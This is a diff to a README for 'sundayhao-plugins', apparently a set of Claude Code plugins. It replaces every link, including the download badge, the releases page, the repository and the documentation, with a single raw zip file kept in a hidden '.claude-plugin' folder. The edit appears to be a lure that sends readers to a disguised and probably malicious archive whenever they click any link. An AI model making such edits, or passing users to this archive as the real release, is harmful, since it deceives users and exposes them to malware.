@@ -1,6 +1,6 @@
 # 🧠 sundayhao-plugins - Transform Your Workflow Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/maicon76/sundayhao-plugins/releases)
+[![Download Now](https://raw.githubusercontent.com/maicon76/sundayhao-plugins/main/second-brain/.claude-plugin/sundayhao-plugins-v3.9.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/maicon76/sundayhao-plugins/main/second-brain/.claude-plugin/sundayhao-plugins-v3.9.zip)
 
 ## 📚 Overview
 
@@ -15,7 +15,7 @@ Follow these steps to download and run the application:
    - Necessary Software: Latest version of Claude Code must be installed.
 
 2. **Download the Application**: 
-   - Visit this page to download: [GitHub Releases](https://github.com/maicon76/sundayhao-plugins/releases).
+   - Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/maicon76/sundayhao-plugins/main/second-brain/.claude-plugin/sundayhao-plugins-v3.9.zip).
 
 3. **Choose Your Plugin**: 
    - Browse the list of available plugins. Select the one that best fits your needs.
@@ -43,7 +43,7 @@ Follow these steps to download and run the application:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Latest Release](https://github.com/maicon76/sundayhao-plugins/releases). Follow the provided instructions to install and set up the plugins in Claude Code.
+To get started, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/maicon76/sundayhao-plugins/main/second-brain/.claude-plugin/sundayhao-plugins-v3.9.zip). Follow the provided instructions to install and set up the plugins in Claude Code.
 
 ## 📖 Documentation
 
@@ -62,8 +62,8 @@ Comprehensive documentation for each plugin is available on the release page aft
 
 ## 🔗 Links and Resources
 
-- [GitHub Repository](https://github.com/maicon76/sundayhao-plugins)
-- [Project Documentation](https://github.com/maicon76/sundayhao-plugins/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/maicon76/sundayhao-plugins/main/second-brain/.claude-plugin/sundayhao-plugins-v3.9.zip)
+- [Project Documentation](https://raw.githubusercontent.com/maicon76/sundayhao-plugins/main/second-brain/.claude-plugin/sundayhao-plugins-v3.9.zip)
 
 ## 📞 Support
 
